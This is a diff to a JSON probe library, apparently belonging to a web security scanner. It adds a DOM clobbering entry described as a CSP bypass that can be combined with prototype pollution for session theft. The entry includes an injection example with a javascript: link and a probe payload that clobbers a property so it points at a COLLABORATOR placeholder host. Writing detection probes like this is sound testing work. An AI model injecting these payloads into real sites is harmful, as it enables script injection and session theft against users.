@@ -893,6 +893,24 @@
           "reference_only": true
         }
       ]
+    },
+    "dom_clobbering_csp_bypass": {
+      "description": "DOM Clobbering to bypass CSP. Named HTML elements (anchors, forms, images, embeds) override global JS properties via the DOM named-property visibility algorithm. Attacker injects <a id=\"config\" href=\"javascript:alert(1)\"> to overwrite window.config. Combined with prototype pollution for session theft. HTB CyberApocalypse 2026 pattern.",
+      "probes": [
+        {
+          "payload": "<a id=x><a id=x name=y href=//COLLABORATOR>",
+          "description": "DOM clobbering probe \u2014 two anchors with same id create an HTMLCollection. document.x.y resolves to the href. If reflected in a page that reads document.x.y as a URL, it triggers navigation to COLLABORATOR.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "COLLABORATOR"
+              ]
+            }
+          ],
+          "reference_only": true
+        }
+      ]
     }
   }
 }
